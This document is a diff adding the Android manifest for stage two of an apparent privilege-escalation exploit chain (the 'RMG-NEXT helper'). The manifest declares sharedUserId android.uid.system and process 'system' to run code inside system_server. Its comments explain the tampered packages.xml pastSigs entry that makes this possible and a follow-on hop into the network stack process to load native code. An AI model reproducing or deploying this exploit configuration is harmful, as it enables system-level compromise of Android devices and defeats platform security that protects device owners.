@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Stage two, and the two attributes that are the whole technique.
+
+  `android:sharedUserId="android.uid.system"` is what makes this APK installable as a system-uid app
+  after its signing certificate has been added to that shared user's `pastSigs` - the edit the app
+  makes to packages.xml, and the reason it works is that these two lines can then be honoured at all.
+  `android:process="system"` is what puts this code *inside* system_server: a process name plus a
+  matching uid is what Android joins by, and system_server is the process that already runs as uid
+  1000 under that name.
+
+  From there the exploit cannot run where it is - system_server may neither dlopen a library out of
+  /data nor map executable memory - so the code hops to com.android.networkstack, which may do both,
+  and that hop is why the receiver below exists.
+
+  The icon is named here the same way the app names it, and both modules read the one copy of it under
+  `launcher-icon/` at the repository root. Two APKs sitting in one launcher should not need two icons.
+
+  The theme is the helper's own file rather than a platform style, and the one thing it adds is that the
+  screen follows the phone's light/dark setting - which is what lets its colours be resolved from the theme
+  at runtime instead of written down a second time beside the app's.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    android:sharedUserId="android.uid.system">
+
+    <application
+        android:label="RMG-NEXT helper"
+        android:icon="@mipmap/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher"
+        android:allowBackup="false"
+        android:process="system"
+        android:theme="@style/Theme.RmgHelper">
+
+        <activity
+            android:name=".Stage2Activity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--
+          Not a broadcast this app sends itself: the hop schedules it explicitly, by component, into
+          network_stack's process - so this declaration is the target of that scheduling rather than an
+          entry point anything on the device can reach (which is what `exported="false"` says).
+        -->
+        <receiver
+            android:name=".StageReceiver"
+            android:exported="false" />
+    </application>
+
+</manifest>
